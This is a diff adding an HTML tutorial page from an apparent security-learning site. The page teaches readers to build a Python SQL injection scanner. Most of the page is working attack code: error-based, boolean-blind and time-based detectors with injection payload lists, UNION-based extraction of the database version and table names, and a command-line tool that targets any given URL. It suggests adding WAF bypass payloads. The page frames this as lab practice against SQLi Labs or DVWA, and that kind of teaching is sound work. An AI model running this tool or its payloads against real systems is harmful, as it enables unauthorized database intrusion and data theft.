@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLi Parameter Tester — sec-projects</title>
+  <meta name="description" content="Automate SQL injection testing — detect vulnerable parameters, test blind/time-based SQLi, and extract database info.">
+  <meta property="og:title" content="SQLi Parameter Tester — sec-projects">
+  <meta property="og:description" content="Automate SQL injection testing — detect vulnerable parameters.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://sec-projects.pages.dev/projects/web/sqli-tester.html">
+  <link rel="canonical" href="https://sec-projects.pages.dev/projects/web/sqli-tester.html">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/theme.css">
+  <link rel="stylesheet" href="/assets/css/layout.css">
+  <link rel="stylesheet" href="/assets/css/components.css">
+</head>
+<body>
+<div class="container" style="max-width:900px; margin: calc(var(--nav-height) + var(--space-8)) auto var(--space-8); padding: 0 var(--space-6);">
+
+<div class="breadcrumbs">
+  <a href="/">Home</a><span class="breadcrumb-sep">/</span>
+  <a href="/?cat=web">Web Security</a><span class="breadcrumb-sep">/</span>
+  <span>SQLi Parameter Tester</span>
+</div>
+
+<div style="margin-bottom:var(--space-8);">
+  <div style="display:flex;align-items:center;gap:var(--space-4);flex-wrap:wrap;margin-bottom:var(--space-3);">
+    <span class="badge badge-intermediate">Intermediate</span>
+    <span style="color:var(--color-text-muted);font-size:var(--font-size-sm);">&#x23F1; 2-4 hours</span>
+  </div>
+  <h1 style="border-bottom:none;margin-bottom:var(--space-3);">SQLi Parameter Tester</h1>
+  <p style="font-size:var(--font-size-lg);color:var(--color-text-secondary);">Automate SQL injection testing — detect vulnerable parameters, test blind/time-based SQLi, and extract database info.</p>
+  <div style="display:flex;flex-wrap:wrap;gap:var(--space-2);margin-top:var(--space-3);">
+    <span class="tag">python</span><span class="tag">sql</span><span class="tag">web-security</span><span class="tag">sqli</span>
+  </div>
+</div>
+
+<div id="progressBtn" style="margin-bottom:var(--space-8);"></div>
+
+<h2>Learning Objectives</h2>
+<ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+  <li>Understand SQL injection types: error-based, blind boolean, blind time-based, and UNION-based</li>
+  <li>Automate parameter discovery and injection testing with Python's <code>requests</code> library</li>
+  <li>Implement response analysis to differentiate vulnerable from non-vulnerable parameters</li>
+  <li>Enumerate database structure — table names, column names — through injection</li>
+  <li>Learn how professional tools like <code>sqlmap</code> work under the hood</li>
+</ul>
+
+<h2>Prerequisites</h2>
+<ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+  <li>Python 3.8+ with <code>requests</code> installed</li>
+  <li>Basic SQL knowledge (SELECT, UNION, WHERE clauses)</li>
+  <li>Understanding of HTTP GET/POST parameters</li>
+  <li>A vulnerable test target: DVWA, SQLi Labs, or bWAPP</li>
+</ul>
+
+<div class="callout">
+  <div class="callout-title">&#x26A0; Ethics & Legal</div>
+  <p>Only test against applications you own or have explicit permission to test. SQL injection against production systems is illegal. Use dedicated vulnerable apps like <a href="https://github.com/Audi-1/sqli-labs">SQLi Labs</a> or <a href="https://github.com/digininja/DVWA">DVWA</a>.</p>
+</div>
+
+<h2>Step 1: Parameter Discovery & Payload Injection Engine</h2>
+<p>Build the core engine that discovers injectable parameters and sends test payloads. We'll support both GET query strings and POST form data.</p>
+
+<pre><code>import requests
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+class SQLiTester:
+    def __init__(self, target_url, method='GET'):
+        self.url = target_url
+        self.method = method.upper()
+        self.session = requests.Session()
+        self.baseline = None  # response without payload
+
+    def get_baseline(self):
+        """Get the normal response for comparison."""
+        try:
+            if self.method == 'GET':
+                self.baseline = self.session.get(self.url, timeout=10)
+            else:
+                parsed = urlparse(self.url)
+                params = parse_qs(parsed.query)
+                form_data = self._extract_form_params()
+                self.baseline = self.session.post(self.url, data=form_data, timeout=10)
+            return True
+        except requests.RequestException as e:
+            print(f"Failed to establish baseline: {e}")
+            return False
+
+    def _extract_form_params(self):
+        from bs4 import BeautifulSoup
+        r = self.session.get(self.url, timeout=10)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        params = {}
+        for inp in soup.find_all('input'):
+            name = inp.get('name')
+            if name:
+                params[name] = inp.get('value', 'test')
+        return params
+
+    def inject_get_param(self, param, payload):
+        """Inject payload into a GET parameter."""
+        parsed = urlparse(self.url)
+        params = parse_qs(parsed.query, keep_blank_values=True)
+        params[param] = [payload]
+        new_query = urlencode(params, doseq=True)
+        test_url = urlunparse(parsed._replace(query=new_query))
+        return self.session.get(test_url, timeout=10)
+
+    def inject_post_param(self, param, payload, form_data):
+        """Inject payload into a POST parameter."""
+        data = dict(form_data)
+        data[param] = payload
+        return self.session.post(self.url, data=data, timeout=10)</code></pre>
+
+<p><strong>Why a session?</strong> <code>requests.Session()</code> preserves cookies across requests — essential when the target uses session-based authentication or CSRF tokens that change per request.</p>
+
+<h2>Step 2: Error-Based Detection</h2>
+<p>The fastest and most reliable detection method: inject payloads that break SQL syntax and check for database error messages in the response.</p>
+
+<pre><code>import re
+
+ERROR_SIGNATURES = {
+    'MySQL': [r"SQL syntax.*MySQL", r"mysql_fetch", r"MySQL.*error",
+              r"Warning.*mysql_", r"valid MySQL result"],
+    'PostgreSQL': [r"PostgreSQL.*ERROR", r"Warning.*\\Wpg_", r"valid PostgreSQL"],
+    'SQLite': [r"SQLite.*error", r"SQLite/JDBCDriver"],
+    'MSSQL': [r"Microsoft OLE DB.*SQL Server", r"ODBC.*Driver.*SQL Server",
+              r"Incorrect syntax near", r"Unclosed quotation mark"],
+    'Oracle': [r"ORA-\d{5}", r"Oracle.*Driver", r"Oracle.*error"],
+}
+
+ERROR_PAYLOADS = [
+    "'",        # Single quote breaks string
+    "\"",        # Double quote breaks string
+    "'--",       # Single quote with comment
+    "')--",      # Close paren + comment
+    "' OR '1'='1", # Tautology (often changes response)
+    "1' AND '1'='2", # False condition
+]
+
+class ErrorBasedDetector:
+    def detect(self, tester, param):
+        for payload in ERROR_PAYLOADS:
+            try:
+                response = tester.inject_get_param(param, payload)
+                body = response.text
+
+                for db, patterns in ERROR_SIGNATURES.items():
+                    for pattern in patterns:
+                        if re.search(pattern, body, re.IGNORECASE):
+                            return {
+                                'method': 'error_based',
+                                'parameter': param,
+                                'payload': payload,
+                                'database': db,
+                                'confidence': 'high',
+                            }
+            except:
+                continue
+        return None</code></pre>
+
+<h2>Step 3: Blind Boolean-Based Detection</h2>
+<p>When error messages are suppressed, use boolean logic — inject AND/OR conditions that change the response in predictable ways.</p>
+
+<pre><code>class BooleanBlindDetector:
+    """Detect SQLi by comparing responses to TRUE vs FALSE conditions."""
+
+    def detect(self, tester, param):
+        true_payload = f"{param}=1' AND '1'='1"
+        false_payload = f"{param}=1' AND '1'='2"
+
+        try:
+            true_resp = tester.inject_get_param(param, "1' AND '1'='1")
+            false_resp = tester.inject_get_param(param, "1' AND '1'='2")
+
+            # Compare response length
+            true_len = len(true_resp.text)
+            false_len = len(false_resp.text)
+            baseline_len = len(tester.baseline.text) if tester.baseline else 0
+
+            # If FALSE condition produces different response from TRUE,
+            # the injection is likely working
+            if abs(true_len - false_len) > 50 or true_resp.status_code != false_resp.status_code:
+                return {
+                    'method': 'blind_boolean',
+                    'parameter': param,
+                    'true_response_length': true_len,
+                    'false_response_length': false_len,
+                    'status_diff': true_resp.status_code != false_resp.status_code,
+                    'confidence': 'medium',
+                }
+        except:
+            pass
+        return None</code></pre>
+
+<h2>Step 4: Time-Based Blind Detection</h2>
+<p>The nuclear option — when all output is hidden, use SLEEP/BENCHMARK to cause measurable time delays.</p>
+
+<pre><code>import time
+
+TIME_PAYLOADS = {
+    'MySQL': [
+        "1' AND SLEEP(5)--",
+        "1' AND BENCHMARK(5000000,MD5('a'))--",
+        "1' AND IF(1=1,SLEEP(5),0)--",
+    ],
+    'PostgreSQL': ["1' AND pg_sleep(5)--"],
+    'MSSQL': ["1'; WAITFOR DELAY '00:00:05'--"],
+    'Oracle': ["1' AND DBMS_LOCK.SLEEP(5)--"],
+}
+
+class TimeBasedDetector:
+    def __init__(self, threshold=4.0):
+        self.threshold = threshold  # seconds to consider "delayed"
+
+    def detect(self, tester, param):
+        # First establish average response time
+        avg_time = self._get_baseline_timing(tester, param)
+
+        for db, payloads in TIME_PAYLOADS.items():
+            for payload in payloads:
+                try:
+                    start = time.time()
+                    tester.inject_get_param(param, payload)
+                    elapsed = time.time() - start
+
+                    if elapsed > self.threshold:
+                        return {
+                            'method': 'time_based',
+                            'parameter': param,
+                            'payload': payload,
+                            'database': db,
+                            'response_time': round(elapsed, 2),
+                            'baseline_time': round(avg_time, 2),
+                            'confidence': 'high',
+                        }
+                except requests.Timeout:
+                    return {
+                        'method': 'time_based',
+                        'parameter': param,
+                        'payload': payload,
+                        'database': db,
+                        'response_time': '>timeout',
+                        'confidence': 'high',
+                    }
+                except:
+                    continue
+        return None
+
+    def _get_baseline_timing(self, tester, param):
+        times = []
+        for _ in range(3):
+            try:
+                start = time.time()
+                tester.inject_get_param(param, 'normal')
+                times.append(time.time() - start)
+            except:
+                pass
+        return sum(times) / len(times) if times else 1.0</code></pre>
+
+<h2>Step 5: Data Extraction & CLI</h2>
+<p>Now put it all together — once a parameter is confirmed vulnerable, extract database metadata via UNION injection.</p>
+
+<pre><code>UNION_PROBES = [
+    # Determine number of columns
+    ("1' ORDER BY {n}--", 'column_count'),
+    # UNION-based extraction
+    ("1' UNION SELECT {cols}--", 'union_select'),
+    # Database version
+    ("1' UNION SELECT @@version,{nulls}--", 'db_version'),
+    # Table enumeration (MySQL)
+    ("1' UNION SELECT table_name,{nulls} FROM information_schema.tables WHERE table_schema=database()--", 'tables'),
+]
+
+def extract_data(tester, param, columns=5):
+    """Try UNION-based data extraction."""
+    results = {}
+
+    # First, find column count
+    for n in range(1, 16):
+        try:
+            resp = tester.inject_get_param(param, f"1' ORDER BY {n}--")
+            if tester.baseline and len(resp.text) != len(tester.baseline.text):
+                columns = n - 1
+                results['column_count'] = columns
+                break
+        except:
+            continue
+
+    # Try to extract version
+    nulls = ','.join(['NULL'] * (columns - 1))
+    try:
+        payload = f"1' UNION SELECT @@version,{nulls}--"
+        resp = tester.inject_get_param(param, payload)
+        results['version_raw'] = resp.text[:500]
+    except:
+        pass
+
+    return results
+
+def main():
+    import argparse
+    parser = argparse.ArgumentParser(description="SQLi Parameter Tester")
+    parser.add_argument("url", help="Target URL with parameters")
+    parser.add_argument("-p", "--param", help="Specific parameter to test")
+    parser.add_argument("--post", action="store_true", help="Use POST method")
+    parser.add_argument("--extract", action="store_true", help="Attempt data extraction")
+    args = parser.parse_args()
+
+    tester = SQLiTester(args.url, 'POST' if args.post else 'GET')
+    if not tester.get_baseline():
+        return
+
+    params = [args.param] if args.param else list(parse_qs(urlparse(args.url).query).keys())
+    detectors = [ErrorBasedDetector(), BooleanBlindDetector(), TimeBasedDetector()]
+
+    for param in params:
+        print(f"\n[*] Testing parameter: {param}")
+        for detector in detectors:
+            result = detector.detect(tester, param)
+            if result:
+                print(f"  [+] {result['method']}: {result.get('database','?')} "
+                      f"(confidence: {result.get('confidence','?')})")
+                if args.extract and result.get('confidence') == 'high':
+                    data = extract_data(tester, param)
+                    print(f"  [*] Extracted: {data}")
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+<h2>Testing Your Tester</h2>
+<p>Use SQLi Labs (Docker) as a test target. It provides deliberately vulnerable PHP apps with progressively harder challenges:</p>
+
+<pre><code># Set up SQLi Labs
+git clone https://github.com/Audi-1/sqli-labs
+cd sqli-labs
+docker-compose up -d
+
+# Test Lesson 1 (basic error-based)
+python sqli_tester.py "http://localhost/Less-1/?id=1"
+
+# Test with a specific parameter
+python sqli_tester.py "http://localhost/Less-1/?id=1&name=test" -p id --extract</code></pre>
+
+<h2>Extension Ideas</h2>
+<ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+  <li>Add second-order SQLi detection — inject into one page, detect on another</li>
+  <li>Implement WAF bypass payloads — URL encoding, double encoding, case variation</li>
+  <li>Add POST JSON/XML injection support for modern API endpoints</li>
+  <li>Integrate with <code>sqlmap</code> for comparison and verification of findings</li>
+  <li>Add cookie-based injection testing (inject into Cookie header)</li>
+</ul>
+
+<h2>Resources & Next Steps</h2>
+<div style="display:flex;flex-direction:column;gap:var(--space-2);margin-bottom:var(--space-8);">
+  <a class="resource-link" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F4D6;</span> PortSwigger: SQL Injection — Comprehensive guide with labs
+  </a>
+  <a class="resource-link" href="https://sqlmap.org/" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F4D8;</span> SQLMap Documentation — Study the gold standard
+  </a>
+  <a class="resource-link" href="https://tryhackme.com/room/sqlinjectionlm" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F3AF;</span> TryHackMe: SQL Injection Lab
+  </a>
+  <a class="resource-link" href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F4CB;</span> OWASP SQL Injection Prevention Cheat Sheet
+  </a>
+  <a class="resource-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F4DC;</span> PayloadsAllTheThings: SQLi Payloads
+  </a>
+</div>
+
+<div class="callout">
+  <div class="callout-title">&#x1F393; Cert Relevance</div>
+  <p>SQL injection is a core topic on <strong>eWPT</strong>, <strong>OSWE</strong>, and the <strong>PNPT</strong> practical exam. Understanding detection techniques (error-based, blind, time-based) is essential for <strong>OSCP</strong> web modules and <strong>Burp Suite Certified Practitioner</strong>. SQLi knowledge is tested on <strong>CompTIA Security+</strong> under application security.</p>
+</div>
+
+</div>
+
+<script src="/assets/js/data.js"></script>
+<script src="/assets/js/theme.js"></script>
+<script src="/assets/js/components.js"></script>
+<script src="/assets/js/progress.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  document.body.prepend(renderNav());
+  document.body.appendChild(renderFooter());
+  const btnContainer = document.getElementById('progressBtn');
+  if (btnContainer) btnContainer.appendChild(renderProgressButton('sqli-tester'));
+  initCopyButtons();
+});
+</script>
+</body>
+</html>
